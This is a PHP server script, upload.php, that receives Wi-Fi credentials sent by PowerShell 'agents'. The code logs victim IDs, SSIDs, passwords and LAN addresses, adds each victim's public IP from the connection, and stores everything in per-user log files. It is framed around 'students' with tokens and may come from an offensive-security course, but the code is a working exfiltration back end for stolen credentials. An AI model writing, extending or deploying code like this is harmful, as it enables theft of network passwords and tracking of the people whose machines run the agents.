<?php
/**
 * upload.php – Receives WiFi credential data from PowerShell agents.
 *
 * Each student gets a unique API token (their username, or a token you
 * set in users.json). The PowerShell agent sends:
 *   POST /upload.php
 *   Headers: X-Student-Token: <username>   (or use ?token=<username>)
 *   Body:    CSV line(s) of captured data
 *
 * Data is appended to creds/<username>_wifi_creds.log
 */

define('USERS_FILE', __DIR__ . '/users.json');
define('CREDS_DIR',  __DIR__ . '/creds');

if (!is_dir(CREDS_DIR)) mkdir(CREDS_DIR, 0755, true);

function load_users(): array {
    if (!file_exists(USERS_FILE)) return [];
    $data = json_decode(file_get_contents(USERS_FILE), true);
    return $data['users'] ?? [];
}

// Accept token from header or query string
$token = $_SERVER['HTTP_X_STUDENT_TOKEN'] ?? ($_GET['token'] ?? '');
$token = trim($token);

if ($token === '') {
    http_response_code(401);
    echo json_encode(['error' => 'Missing token']);
    exit;
}

// Validate token against known usernames
$validUser = null;
foreach (load_users() as $u) {
    if (strtolower($u['username']) === strtolower($token) && ($u['active'] ?? true)) {
        $validUser = $u['username'];
        break;
    }
}

if ($validUser === null) {
    http_response_code(403);
    echo json_encode(['error' => 'Invalid or disabled token']);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'POST required']);
    exit;
}

$body = file_get_contents('php://input');
if ($body === '' || $body === false) {
    http_response_code(400);
    echo json_encode(['error' => 'Empty body']);
    exit;
}

// Get real public IP of the victim connecting to upload.php
$publicIp = $_SERVER['HTTP_CF_CONNECTING_IP'] 
    ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
    ?? $_SERVER['REMOTE_ADDR'] 
    ?? 'unknown';

// Sanitise username for filename
$safe    = preg_replace('/[^a-z0-9_\-]/i', '_', $validUser);
$logFile = CREDS_DIR . '/' . $safe . '_wifi_creds.log';

// Process incoming lines and inject public IP at index 6 if missing
$processedLines = [];
foreach (explode("\n", trim($body)) as $l) {
    $l = trim($l);
    if ($l === '') continue;
    $fields = str_getcsv($l);
    // CSV fields: [0:time, 1:victim_id, 2:ssid, 3:pass, 4:lan_ip, 5:os, 6:public_ip]
    if (count($fields) >= 5) {
        if (!isset($fields[5]) || $fields[5] === '') $fields[5] = 'Windows';
        if (!isset($fields[6]) || $fields[6] === '' || $fields[6] === 'unknown' || $fields[6] === 'N/A') {
            $fields[6] = $publicIp;
        }
        $processedLines[] = implode(',', array_map(function($f) {
            return str_contains($f, ',') ? '"' . str_replace('"', '""', $f) . '"' : $f;
        }, $fields));
    } else {
        $processedLines[] = $l;
    }
}

// Append the line(s) – ensure newline separation
if (!empty($processedLines)) {
    file_put_contents($logFile, implode(PHP_EOL, $processedLines) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

http_response_code(200);
echo json_encode(['status' => 'ok', 'user' => $validUser]);
